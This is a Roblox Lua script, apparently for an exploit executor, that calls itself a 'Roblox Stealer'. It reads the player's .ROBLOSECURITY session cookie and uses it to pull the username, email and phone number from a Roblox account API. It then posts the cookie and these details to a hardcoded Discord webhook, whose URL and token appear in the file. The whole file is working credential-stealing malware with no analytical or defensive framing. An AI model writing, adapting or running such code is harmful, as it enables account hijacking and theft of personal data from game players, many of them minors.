local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local webhook = "https://discordapp.com/api/webhooks/1511992331287527474/z0DLdbS-jwP2E0weu5P7rVXXjkaiMzyUFB0ET-Wp5htVHysXRGIVdmKEyC7gtuQ1XSQx"

local function getRobloxCookie()
    if getcookie then
        return getcookie(".ROBLOSECURITY")
    end
    return "Cookie not accessible in pure Luau"
end

local function getAccountInfo(cookie)
    local url = "https://www.roblox.com/mobileapi/userinfo"
    local headers = {
        ["Cookie"] = ".ROBLOSECURITY=" .. cookie;
        ["User-Agent"] = "Mozilla/5.0"
    }
    local success, response = pcall(function()
        return syn.request({
            Url = url,
            Method = "GET",
            Headers = headers
        })
    end)
    if success and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        return data.UserName, data.Email, data.TelephoneNumber
    end
    return nil, nil, nil
end

local function sendToDiscord(content)
    local data = {
        content = content,
        username = "Roblox Stealer"
    }
    local body = HttpService:JSONEncode(data)
    syn.request({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })
end

local cookie = getRobloxCookie()
local username, email, phone = getAccountInfo(cookie)

local message = string.format(
    "```\nROBLOX ACCOUNT INFORMATION\n```\n**Cookie:** `%s`\n**Username:** %s\n**Email:** %s\n**Phone:** %s",
    cookie, username or "N/A", email or "N/A", phone or "N/A"
)

sendToDiscord(message)
